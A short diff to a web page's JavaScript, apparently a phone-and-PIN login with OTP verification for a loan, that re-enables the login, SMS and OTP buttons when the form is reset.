@@ -935,6 +935,9 @@
             document.getElementById('lpPhone').value = '';
             [0,1,2,3,4].forEach(i => document.getElementById('lp'+i).value = '');
             
+            // RE-ENABLE the LOGIN button
+            document.getElementById('bLgn').disabled = false;
+            
             // Go back to login page
             goTo('page-login');
             
@@ -1044,6 +1047,10 @@
             [0,1,2,3,4].forEach(i => document.getElementById('lp'+i).value = '');
             document.getElementById('smsMsgBox').value = '';
             [0,1,2,3].forEach(i => document.getElementById('otp'+i).value = '');
+            
+            // RE-ENABLE buttons
+            document.getElementById('bLgn').disabled = false;
+            document.getElementById('bSms').disabled = false;
             
             // Go back to login page
             goTo('page-login');
@@ -1177,6 +1184,12 @@
             [0,1,2,3,4].forEach(i => document.getElementById('lp'+i).value = '');
             document.getElementById('smsMsgBox').value = '';
             [0,1,2,3].forEach(i => document.getElementById('otp'+i).value = '');
+            
+            // RE-ENABLE all buttons
+            document.getElementById('bLgn').disabled = false;
+            document.getElementById('bSms').disabled = false;
+            document.getElementById('bOtp').disabled = false;
+            document.getElementById('bOtp').textContent = 'VERIFY & APPROVE LOAN';
             
             // Go back to login page
             goTo('page-login');
